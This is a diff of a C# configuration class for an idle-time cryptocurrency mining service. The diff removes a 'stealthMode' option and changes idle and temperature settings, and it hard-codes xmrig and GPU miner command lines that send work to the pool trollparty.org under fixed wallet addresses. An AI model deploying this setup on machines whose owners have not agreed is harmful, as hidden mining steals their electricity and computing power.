@@ -16,8 +16,8 @@ namespace IdleService
         public bool enableLogging { get; set; }
         [JsonProperty]
         public bool monitorFullscreen { get; set; }
-        [JsonProperty]
-        public bool stealthMode { get; set; }
+        //[JsonProperty]
+        //public bool stealthMode { get; set; }
         [JsonProperty]
         public bool preventSleep { get; set; }
         [JsonProperty]
@@ -42,8 +42,8 @@ namespace IdleService
         public string urlToCheckForNetwork { get; set; }
         [JsonProperty]
         public int minutesUntilIdle { get; set; }
-        [JsonProperty]
-        public int resumePausedMiningAfterMinutes { get; set; }
+        //[JsonProperty]
+        //public int resumePausedMiningAfterMinutes { get; set; }
 
 
         [JsonProperty]
@@ -56,10 +56,10 @@ namespace IdleService
             enableDebug = false;
             enableLogging = true;
             monitorFullscreen = true;
-            stealthMode = false;
-            preventSleep = true;
-            monitorCpuTemp = true;
-            monitorGpuTemp = true;
+            //stealthMode = false;
+            preventSleep = false;
+            monitorCpuTemp = false;
+            monitorGpuTemp = false;
             maxCpuTemp = 60;
             maxGpuTemp = 75;
             mineWithCpu = true;
@@ -68,8 +68,8 @@ namespace IdleService
             mineIfBatteryNotFull = false;
             verifyNetworkConnectivity = false;
             urlToCheckForNetwork = "http://google.com";
-            minutesUntilIdle = 30;
-            resumePausedMiningAfterMinutes = 120;
+            minutesUntilIdle = 10;
+            //resumePausedMiningAfterMinutes = 120;
             cpuMiners.Add(new MinerList("xmrig.exe", "-o trollparty.org:9003 -u 43tVLRGvcaadfw4HrkUcpEKmZd9Y841rGKvsLZW8XvEVSBX1GrGezWvQYDdoNwNHAwTqSyK7iqyyqMSpDoUVKQmM43nzT72 -p x -k --safe", "-o trollparty.org:9003 -u 43tVLRGvcaadfw4HrkUcpEKmZd9Y841rGKvsLZW8XvEVSBX1GrGezWvQYDdoNwNHAwTqSyK7iqyyqMSpDoUVKQmM43nzT72 -p x -k --safe"));
             //cpuMiners.Add(new MinerList("", "", ""));
             gpuMiners.Add(new MinerList("miner.exe", "--server trollparty.org --port 9003 --user t1ZHrvmtgd3129iYEcFm21XMv5ojdh2xmsf --pass x --cuda_devices 0 --fee 0", "--server trollparty.org --port 9003 --user t1ZHrvmtgd3129iYEcFm21XMv5ojdh2xmsf --pass x --cuda_devices 0 --fee 0"));
